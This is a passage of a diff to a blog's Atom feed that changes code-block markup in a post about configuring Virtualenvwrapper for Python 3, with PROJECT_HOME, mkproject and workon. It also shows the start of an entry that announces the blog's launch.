+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Congratulations! Your Virtualenvwrapper for Python 3 is now ready to use.&lt;/p&gt;
@@ -840,21 +876,21 @@ deactivate virtualenv_name &lt;span class="c1"&gt;# Deactivate virtualenv&lt;/sp
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;EDIT&lt;/strong&gt;: in a previous version of this article, I suggested to use the postactivate script to automatically navigate to the project folder when activating the virtualenv. However, since I discovered that such a task is automatically performed by the projects plugin, I updated the post accordingly.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;While the possibility to have isolated virtual environments just a &lt;code&gt;mkvirtualenv&lt;/code&gt; away had immediately convinced me of the usefulness of Virtualenvwrapper, projects made me falling in love for it.&lt;/p&gt;
 &lt;p&gt;My typical workflow is to create a virtualenv and then create a project folder with the same name. So why not setting up Virtualenvwrapper to automatically do it for me every time I create a new virtualenv? Specify PROJECT_HOME in ~/.bashrc will do the trick:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;VIRTUALENVWRAPPER_PYTHON=&amp;#39;/usr/bin/python3&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;VIRTUALENVWRAPPER_PYTHON=&amp;#39;/usr/bin/python3&amp;#39;&lt;/span&gt;
 &lt;span class="err"&gt;PROJECT_HOME=&amp;#39;/path/to/where/you/want/your/project/folder/to/be/created&amp;#39; # This needs to be placed before the virtualenvwrapper command as well&lt;/span&gt;
 &lt;span class="err"&gt;source /usr/local/bin/virtualenvwrapper.sh&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, when typing&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkproject my_project
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkproject my_project
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Virtualenvwrapper will automatically create a virtualenv and a folder called &lt;em&gt;my_project&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;Cherry on top, projects automaticatilly navigates to the project folder when activating the virtualenv. Thus, when typing&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;workon my_project
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;workon my_project
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Virtualenvwrapper activates the virtualenv and teleports me to ~/Projects/my_project. Neat!&lt;/p&gt;</content><category term="/dev"></category><category term="virtualenvwrapper"></category><category term="virtualenv"></category><category term="python3"></category></entry><entry><title>Up and running!</title><link href="https://railslide.io/up-and-running.html" rel="alternate"></link><published>2014-06-03T00:00:00+02:00</published><updated>2014-06-03T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2014-06-03:/up-and-running.html</id><summary type="html">&lt;p&gt;Celebrating the first post of the blog and what to do next.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ok, my Pelican and GitHub pages powered blog seems to be up and running! Yay!&lt;/p&gt;
